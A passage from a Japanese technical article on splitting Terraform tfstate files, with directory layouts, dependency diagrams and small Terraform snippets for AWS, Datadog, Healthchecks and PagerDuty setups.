subgraph AWSアカウント        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end▼ 依存関係がある場合同様に分割したと仮定します。ここで仮定した状況では、 foo-tfstate ➡︎ bar-tfstate の方向に依存しているとします。そのため、---> (波線矢印) を使用して、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: foo-tfstateファイルは、bar-tfstateファイルに依存---%%{init:{\'theme\':\'default\'}}%%flowchart TD    subgraph AWSアカウント        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end    foo -. 依存 .-> bar04. tfstate ファイルに基づくその他の設計リポジトリ \uD83D\uDC31 の設計リポジトリ分割ここまでで、tfstateファイル分割について簡単に紹介しました。リポジトリの分割は、tfstateファイル分割に基づいて設計しましょう。可能であれば、1個のリポジトリに1個のtfstateファイルをおくことが望ましいです。異なるリポジトリにtfstateファイルをおいた方がよい場合については、分割パターン で説明しています。\uD83D\uDC31 foo-repository/├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する...\uD83D\uDC31 bar-repository/├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する...ディレクトリ \uD83D\uDCC2 構成リポジトリ内のディレクトリ構成も、tfstateファイル分割に基づいて設計しましょう。率直に言うと、Terraformのディレクトリ構成のパターンは無数にあります。そのため、基準なしにディレクトリ構成を考えると何でもあり になってしまいます。その一方で、tfstateファイル分割に基づいて設計することにより、明確なディレクトリ構成パターン として抽出可能になります。\uD83D\uDC31 repository/├── \uD83D\uDCC2 foo/│    ├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 bar/      ├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する      ...▶ ローカルモジュールのディレクトリ構成の設計についてresource、data) のセットを使い回すことを目的とした、ローカルモジュールがあります。今回、これのディレクトリ構成は設計に含めていません。混同しやすいのですが、tfstateファイル分割に基づくディレクトリ構成とローカルモジュール内のそれは、全く別のテーマとして切り離して考えることができます\uD83D\uDC4Dリモートバックエンド \uD83E\uDEA3 の設計リモートバックエンド分割本記事では、リモートバックエンドとしてAWS S3バケットを使用することを想定しています。リモートバックエンドの分割は、tfstateファイル分割に基づいて設計しましょう。異なるリモートバックエンドにtfstateファイルをおいた方がよい場合については、分割パターン で説明しています。\uD83E\uDEA3 foo-bucket/│└── terraform.tfstate # fooコンポーネントの状態を持つ\uD83E\uDEA3 bar-bucket/│└── terraform.tfstate # barコンポーネントの状態を持つディレクトリ構成もし、リモートバックエンドをtfstateファイル分割に基づいて分割しなかったとします。その場合は、代わりにリモートバックエンド内のディレクトリ構成をtfstateファイル分割に基づいて設計しましょう。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 foo/│    └── terraform.tfstate # fooコンポーネントの状態を持つ│└── \uD83D\uDCC2 bar/      └── terraform.tfstate # barコンポーネントの状態を持つ05. 状態の依存関係の定義方法terraform_remote_stateブロックの場合terraform_remote_stateブロックによる依存terraform_remote_stateブロックには、以下のメリデメがあります。 アーキテクチャ特性  メリット ⭕️                                                                        デメリット \xd7                                                                                                                                                      可読性                 -                                                                                  terraform_remote_stateブロックに加えてoutputブロックも実装が必要であり、outputブロックは依存先のAWSリソースが一見してわかりにくい。                             拡張性                 依存先のAWSリソースに関わらず、同じterraform_remote_stateブロックを使い回せる。  -                                                                                                                                                                     保守性                 -                                                                                  依存先と依存元の間でTerraformのバージョンに差がありすぎると、tfstateファイル間で互換性がなくなり、terraform_remote_stateブロックの処理が失敗する。 本記事では、 terraform_remote_state ブロックを使用して、状態の依存関係を定義 していきます。tfstateファイルが他のtfstateファイルに依存する方法として、後述のAWSリソース別dataブロックがあります。The terraform_remote_state Data Source | Terraform | HashiCorp Developer状態の依存関係図例えば、AWSリソースからなるプロダクトをいくつかのtfstateファイル (foo-tfstate、bar-tfstate) に分割したと仮定します。ここで仮定した状況では、bar-tfstateファイルはVPCの状態を持っており、 foo-tfstate ファイルは bar-tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: terraform_remote_stateブロックを使用した依存関係---%%{init:{\'theme\':\'default\'}}%%flowchart TD    subgraph bucket        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end    foo -. VPCの状態に依存 .-> barリポジトリのディレクトリ構成tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。ディレクトリの設計方法は、分割パターン で説明しています。\uD83D\uDC31 repository/├── \uD83D\uDCC2 foo/│    ├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する│    ├── remote_state.tf # terraform_remote_stateブロックを使用し、bar-tfstate ファイルに依存する│    ├── provider.tf│    ...│└── \uD83D\uDCC2 bar/      ├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する      ├── output.tf # 他の tfstate ファイルから依存される      ├── provider.tf      ...foo-tfstateファイルがbar-tfstateファイルに依存するために必要な実装は、以下の通りになります。resource \\"example\\" \\"foo\\" {  # fooリソースは、bar-tfstate ファイルのVPCに依存する  vpc_id = data.terraform_remote_state.bar.outputs.bar_vpc_id  ...}data \\"terraform_remote_state\\" \\"bar\\" { backend = \\"s3\\"  config = {    bucket = \\"tfstate\\"    key    = \\"bar/terraform.tfstate\\"    region = \\"ap-northeast-1\\"  }}# VPCの状態は、bar-tfstate ファイルで持つoutput \\"bar_vpc_id\\" {  value = aws_vpc.bar.id}resource \\"aws_vpc\\" \\"bar\\" {  ...}リモートバックエンドのディレクトリ構成tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 foo│    └── terraform.tfstate # fooコンポーネントの状態を持つ│└── \uD83D\uDCC2 bar      └── terraform.tfstate # barコンポーネントの状態を持つAWSリソース別dataブロックの場合AWSリソース別dataブロックによる依存AWSリソース別dataブロックには、以下のメリデメがあります。 アーキテクチャ特性  メリット ⭕️                                                                                                                                     デメリット \xd7                                                 可読性                 依存先のAWSリソースがわかりやすい。                                                                                                             -                                                                拡張性                 -                                                                                                                                               依存先のAWSリソース別dataブロックが必要である。                保守性                 依存先と依存元の間でTerraformのバージョンに差があっても、tfstateファイル間で直接的に依存するわけではないため、バージョン差の影響を受けない。  -                                                 今回は使用しませんが、依存関係の他の定義方法として、AWSリソース別dataブロックがあります。これは、tfstateファイルが自身以外 (例：コンソール画面、他のtfstateファイル) で作成されたAWSリソースの状態に依存するために使用できます。terraform_remote_stateブロックとは異なり、直接的にはtfstateファイルに依存しません。AWSリソース別dataブロックの場合は、実際のAWSリソースの状態に依存することにより、間接的にAWSリソースのtfstateファイルに依存することになります。Data Sources - Configuration Language | Terraform | HashiCorp Developer状態の依存関係図例えば、AWSリソース別dataブロックも同様にして、AWSリソースからなるプロダクトをいくつかのtfstateファイル (foo-tfstate、bar-tfstate) に分割したと仮定します。ここで仮定した状況では、bar-tfstateファイルはVPCの状態を持っており、 foo-tfstate ファイルは bar-tfstate ファイルに依存しているとします。想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: dataブロックを使用した依存関係---%%{init:{\'theme\':\'default\'}}%%flowchart TD    subgraph bucket        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end    foo -. VPCの状態に依存 .-> barリポジトリのディレクトリ構成ディレクトリ構成は、tfstateファイル分割に基づいて、以下の通りになります。\uD83D\uDC31 repository/├── \uD83D\uDCC2 foo/│    ├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する│    ├── data.tf # dataブロックを使用し、bar-tfstate ファイルに依存する│    ├── provider.tf│    ...│└── \uD83D\uDCC2 bar/      ├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する      ├── provider.tf      ...foo-tfstateファイルがbar-tfstateファイルに依存するために必要な実装は、以下の通りになります。# fooリソースの状態は、foo-tfstate ファイルで持つresource \\"example\\" \\"foo\\" {  # fooリソースは、bar-tfstate ファイルのVPCに依存する  vpc_id     = data.aws_vpc.bar.id}# VPCの状態は、bar-tfstate ファイルで持つdata \\"aws_vpc\\" \\"bar\\" {  filter {    name   = \\"tag:Name\\"    values = [\\"<bar-tfstateが持つVPCの名前>\\"]  }}リモートバックエンドのディレクトリ構成tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 foo│    └── terraform.tfstate # fooコンポーネントの状態を持つ│└── \uD83D\uDCC2 bar      └── terraform.tfstate # barコンポーネントの状態を持つ06. tfstate ファイルの分割パターンオススメな設計の一覧前述の通り、tfstateファイルの分割の境界は、『他の状態にできるだけ依存しないリソースの関係』から見つけることができます。分割しすぎると terraform_remote_stateブロック地獄 になるため、細かすぎず粗すぎない適切な境界を見つけていきましょう。今回は、私が考える分割パターンをいくつか紹介します。全てが実用的なパターンというわけでないため、オススメするものを ★ としています。推奨・任意    tfstate分割パターン大分類    tfstate分割パターン小分類オススメ    対応するリポジトリ構成 \uD83D\uDC31    対応するリモートバックエンド構成 \uD83E\uDEA3  推奨    上層    プロバイダーのアカウント別    ★★★    リポジトリ自体または上層ディレクトリ    リモートバックエンド自体または上層ディレクトリ  下層実行環境別    ★★★    下層ディレクトリ    下層ディレクトリ  任意    中間層    運用チーム責務範囲別    ★★    中間層ディレクトリ    中間層ディレクトリ  プロダクトのサブコンポーネント別    ★★  運用チーム責務範囲別\xd7プロダクトのサブコンポーネント別(組み合わせ)    ★  同じテナント内のプロダクト別      AWSリソースの種類グループ別      AWSリソースの状態の変更頻度グループ別      大分類 (上層/下層/中間層) とディレクトリ構成の関係リポジトリの場合記事内のここ で、リポジトリ内のディレクトリ構成はtfstateファイル分割に基づいて設計するべき、という説明をしました。tfstateファイルの分割パターンは、上層/下層/中間層 の層に大別できます。これらの層は、以下の通りリポジトリ自体・ディレクトリ構成の設計方法に影響します。# リポジトリ自体を分割する場合\uD83D\uDC31 上層/├── \uD83D\uDCC2 中間層/│    ├── \uD83D\uDCC2 下層/│    │    ├── backend.tfvars # 分割された tfstate ファイルを指定する│    │    ...│    │...# リポジトリ内のディレクトリを分割する場合\uD83D\uDC31 リポジトリ/├── \uD83D\uDCC2 上層/│    ├── \uD83D\uDCC2 中間層/│    │    ├── \uD83D\uDCC2 下層/│    │    │    ├── backend.tfvars # 分割された tfstate ファイルを指定する│    │    │    ...│    │    │...リモートバックエンドの場合記事内のここ で、リモートバックエンドのディレクトリ構成についても言及しました。これらの層は、以下の通りリモートバックエンド自体・ディレクトリ構成の設計方法に影響します。# リモートバックエンド自体を分割する場合\uD83E\uDEA3 上層/├── \uD83D\uDCC2 中間層/│    ├── \uD83D\uDCC2 下層/│    │    └── terraform.tfstate # 分割された状態を持つ│    ││    │...# リモートバックエンド内のディレクトリを分割する場合\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 上層/│    ├── \uD83D\uDCC2 中間層/│    │    ├── \uD83D\uDCC2 下層/│    │    │    └── terraform.tfstate # 分割された状態を持つ│    │    ││    │    │...07. 上層の分割 (推奨)上層の分割について上層の分割は 推奨 です。Terraformに携わる管理者の数が少なくても採用した方がよいです。tfstateファイルをパターンに応じて分割し、これに基づいてディレクトリ・リモートバックエンドも設計しましょう。プロバイダーのアカウント別 - ★★★この分割方法について上層分割の中でも、基本的な方法の1つです。プロバイダーのアカウント別にtfstateファイルを分割し、上層もこれに基づいて設計します。この分割方法により、各プロバイダーの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度についてtfstateファイルで状態を管理せざるを得ない場合があります。例えば、Kubernetesのプロバイダーは、EKSと同じtfstateファイルで管理した方がよいです\uD83D\uDC4DTerraform Registry【プロバイダーアカウント別】状態の依存関係図例えば、以下のプロバイダーを使用したい状況と仮定します。主要プロバイダー (AWS)アプリ/インフラ監視プロバイダー (Datadog)ジョブ監視プロバイダー (Healthchecks)インシデント管理プロバイダー (PagerDuty)ここで仮定した状況では、各プロバイダーの tfstate ファイル間で状態が相互に依存しているとします。AWSリソース間の相互依存ではないため、循環参照は起こりません。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: プロバイダーのアカウント別---%%{init:{\'theme\':\'default\'}}%%flowchart LR    subgraph PagerDuty        pagerDuty[\\"tfstate\\"]    end    subgraph Healthchecks        healthchecks[\\"tfstate\\"]    end    subgraph Datadog        datadog[\\"tfstate\\"]    end    subgraph AWS        aws[\\"tfstate\\"]    end    aws -...-> datadog    aws -...-> healthchecks    aws -...-> pagerDuty    datadog -...-> aws    healthchecks -...-> aws    pagerDuty -...-> aws【プロバイダーアカウント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合プロバイダーアカウント別に分割したtfstateファイルを、異なるリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 aws-repository/├── backend.tf # AWSの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...\uD83D\uDC31 datadog-repository/├── backend.tf # Datadogの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...\uD83D\uDC31 healthchecks-repository/├── backend.tf # Healthchecksの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...\uD83D\uDC31 pagerduty-repository/├── backend.tf # PagerDutyの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...▼ 同じリポジトリの場合プロバイダーアカウント別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 repository/├── \uD83D\uDCC2 aws/│    ├── backend.tf # AWSの状態を持つ tfstate ファイルを指定する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ...│├── \uD83D\uDCC2 datadog/│    ├── backend.tf # Datadogの状態を持つ tfstate ファイルを指定する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ...│├── \uD83D\uDCC2 healthchecks/│    ├── backend.tf # Healthchecksの状態を持つ tfstate ファイルを指定する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ...│└── \uD83D\uDCC2 pagerduty/      ├── backend.tf # PagerDutyの状態を持つ tfstate ファイルを指定する      ├── output.tf # 他の tfstate ファイルから依存される      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── provider.tf      ...【プロバイダーアカウント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合プロバイダーアカウント別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83E\uDEA3 aws-bucket/│└── terraform.tfstate # AWSの状態を持つ\uD83E\uDEA3 datadog-bucket/│└── terraform.tfstate # Datadogの状態を持つ\uD83E\uDEA3 healthchecks-bucket/│└── terraform.tfstate # Healthchecksの状態を持つ\uD83E\uDEA3 pagerduty-bucket/│└── terraform.tfstate # PagerDutyの状態を持つ▼ 同じリモートバックエンドの場合プロバイダーアカウント別に分割したtfstateファイルを、同じリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 aws│    └── terraform.tfstate # AWSの状態を持つ│├── \uD83D\uDCC2 datadog│    └── terraform.tfstate # Datadogの状態を持つ│├── \uD83D\uDCC2 healthchecks│    └── terraform.tfstate # Healthchecksの状態を持つ│└── \uD83D\uDCC2 pagerduty      └── terraform.tfstate # PagerDutyの状態を持つ08. 下層の分割 (推奨)下層の分割について下層の分割は 推奨 です。Terraformに携わる管理者の数が少なくても採用した方がよいです。tfstateファイルをパターンに応じて分割し、これに基づいてディレクトリ・リモートバックエンドも設計しましょう。実行環境別 - ★★★この分割方法について下層分割の中でも、基本的な方法の1つです。実行環境別にtfstateファイルを分割し、下層もこれに基づいて設計します。この分割方法により、各実行環境の管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。Terraform: Up and Running: Writing Infrastructure as CodeHow to manage Terraform state. A guide to file layout, isolation, and… | by Yevgeniy Brikman | Gruntwork▶ おすすめ度について【実行環境別】状態の依存関係図例えば、以下の実行環境を構築したい状況と仮定します。Tes環境 (検証環境)Stg環境 (ユーザー受け入れ環境)Prd環境 (本番環境)かつ、以下のプロバイダーを使用したい状況と仮定します。主要プロバイダー (AWS)アプリ/インフラ監視プロバイダー (Datadog)ジョブ監視プロバイダー (Healthchecks)インシデント管理プロバイダー (PagerDuty)ここで仮定した状況では、各実行環境の tfstate ファイルは他の実行環境には依存していないとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 実行環境別---%%{init:{\'theme\':\'default\'}}%%flowchart LR    subgraph PagerDuty        pagerDuty[\\"tfstate\\"]    end    subgraph Healthchecks        healthchecks[\\"tfstate\\"]    end    subgraph Datadog        datadog[\\"tfstate\\"]    end    subgraph AWS        subgraph tes-bucket            tes[\\"tfstate\\"]        end        subgraph stg-bucket            stg[\\"tfstate\\"]        end        subgraph prd-bucket            prd[\\"tfstate\\"]        end    end    tes -...-> datadog    tes -...-> healthchecks    tes -...-> pagerDuty    datadog -...-> tes    healthchecks -...-> tes    pagerDuty -...-> tes【実行環境別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合プロバイダーアカウント別にtfstateファイルを分割することは推奨としているため、その上でディレクトリ構成を考えます。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 aws-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # Tes環境のAWSリソースの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境└── \uD83D\uDCC2 prd/ # Prd環境\uD83D\uDC31 datadog-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/│    ├── backend.tfvars # Tes環境のDatadogの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/└── \uD83D\uDCC2 prd/\uD83D\uDC31 healthchecks-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/│    ├── backend.tfvars # HealthchecsのTes環境の状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/└── \uD83D\uDCC2 prd/\uD83D\uDC31 pagerduty-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/│    ├── backend.tfvars # Tes環境のPagerDutyの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/└── \uD83D\uDCC2 prd/▼ 同じリポジトリの場合プロバイダーアカウント別にtfstateファイルを分割することは推奨としているため、その上でディレクトリ構成を考えます。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 repository/├── \uD83D\uDCC2 aws/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # Tes環境のAWSリソースの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    └── \uD83D\uDCC2 prd/ # Prd環境│├── \uD83D\uDCC2 datadog/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── \uD83D\uDCC2 tes/│    │    ├── backend.tfvars # Tes環境のDatadogの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│├── \uD83D\uDCC2 healthchecks/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── \uD83D\uDCC2 tes/│    │    ├── backend.tfvars # Tes環境のHealthchecksの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│└── \uD83D\uDCC2 pagerduty/      ├── output.tf # 他の tfstate ファイルから依存される      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── provider.tf      ├── \uD83D\uDCC2 tes/      │    ├── backend.tfvars # Tes環境のPagerDutyの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/      └── \uD83D\uDCC2 prd/【実行環境別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合実行環境別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。例えば、前述の依存関係図の状況と仮定します。\uD83E\uDEA3 tes-aws-bucket/│└── terraform.tfstate # Tes環境のAWSリソースの状態を持つ\uD83E\uDEA3 tes-datadog-bucket/│└── terraform.tfstate # Tes環境のDatadogの状態を持つ\uD83E\uDEA3 tes-healthchecks-bucket/│└── terraform.tfstate # Tes環境のHealthchecksの状態を持つ\uD83E\uDEA3 tes-pagerduty-bucket/│└── terraform.tfstate # Tes環境のPagerDutyの状態を持つ▼ 同じリモートバックエンド x AWSアカウント別に異なる実行環境 の場合プロバイダーアカウント別に分割したtfstateファイルを、同じリモートバックエンドで管理します。また、AWSアカウント別に異なる実行環境を作成していると仮定します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 aws/│    └── terraform.tfstate # Tes環境のAWSリソースの状態を持つ│├── \uD83D\uDCC2 datadog/│    └── terraform.tfstate # Tes環境のDatadogの状態を持つ│├── \uD83D\uDCC2 healthchecks/│    └── terraform.tfstate # Tes環境のHealthchecksの状態を持つ│└── \uD83D\uDCC2 pagerduty/      └── terraform.tfstate # Tes環境のPagerDutyの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...▼ 同じリモートバックエンド x 単一のAWSアカウント内に全ての実行環境 の場合プロバイダーアカウント別に分割したtfstateファイルを、同じリモートバックエンドで管理します。また、単一のAWSアカウント内に全実行環境を作成しているとします。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 aws/│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    └── terraform.tfstate # Tes環境のAWSリソースの状態を持つ│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    └── \uD83D\uDCC2 prd/ # Prd環境│├── \uD83D\uDCC2 datadog/│    ├── \uD83D\uDCC2 tes/│    │    └── terraform.tfstate # Tes環境のDatadogの状態を持つ│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│├── \uD83D\uDCC2 healthchecks/│    ├── \uD83D\uDCC2 tes/│    │    └── terraform.tfstate # Tes環境のHealthchecksの状態を持つ│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│└── \uD83D\uDCC2 pagerduty/      ├── \uD83D\uDCC2 tes/      │    └── terraform.tfstate # Tes環境のPagerDutyの状態を持つ      │      ├── \uD83D\uDCC2 stg/      └── \uD83D\uDCC2 prd/09. 中間層の分割 (任意)中間層の分割について中間層の分割は 任意 です。Terraformに携わる管理者が多くなるほど、効力を発揮します。運用チーム責務範囲別 - ★★この分割方法について運用チーム (例：アプリチーム、インフラチーム) のAWSリソースの責務範囲別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各運用チームが互いに影響を受けずに、terraformコマンドの結果を得られるようになります。AWS CloudFormation best practices - AWS CloudFormationTerraform in Action (English Edition)▶ おすすめ度について【チーム別】状態の依存関係図例えば、以下の運用チームに分割した状況と仮定します。frontendチーム (アプリのフロントエンド領域担当)backendチーム (アプリのバックエンド領域担当)sreチーム (インフラ領域担当)ここで仮定した状況では、各チームが管理する tfstate ファイル間で状態が相互に依存しているとします。AWSリソース間の相互依存ではないため、循環参照は起こりません。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 運用チーム責務範囲別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            frontend[\\"frontend-team-tfstate<br>(CloudFront, S3, など)\\"]            backend[\\"backend-team-tfstate<br>(API Gateway, ElastiCache, RDS, SES, SNS, など)\\"]            sre[\\"sre-team-tfstate<br>(ALB, CloudWatch, EC2, ECS, EKS, IAM, VPC, など)\\"]            frontend-..->sre            backend-..->sre            sre-..->frontend            sre-..->backend        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【チーム別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合この場合では、運用チーム責務範囲別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-frontend-team-repository/ # frontendチーム├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── cloudfront.tf├── s3.tf├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する      ...\uD83D\uDC31 aws-backend-team-repository/ # backendチーム├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── elasticache.tf├── ses.tf├── sns.tf├── rds.tf├── \uD83D\uDCC2 tes│    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg│    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd      ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する       ...\uD83D\uDC31 aws-sre-team-repository/ # sreチーム├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── alb.tf├── cloudwatch.tf├── ec2.tf├── ecs.tf├── eks.tf├── iam.tf├── vpc.tf├── \uD83D\uDCC2 tes│    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg│    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd      ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する      ...▼ 同じリポジトリの場合この場合では、運用チーム責務範囲別に分割したtfstateファイルを、異なるリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 frontend-team # frontendチーム│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudfront.tf│    ├── s3.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 backend-team # backendチーム│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── elasticache.tf│    ├── ses.tf│    ├── sns.tf│    ├── rds.tf│    ├── \uD83D\uDCC2 tes│    │    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg│    │    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd│          ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 sre-team # sreチーム      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      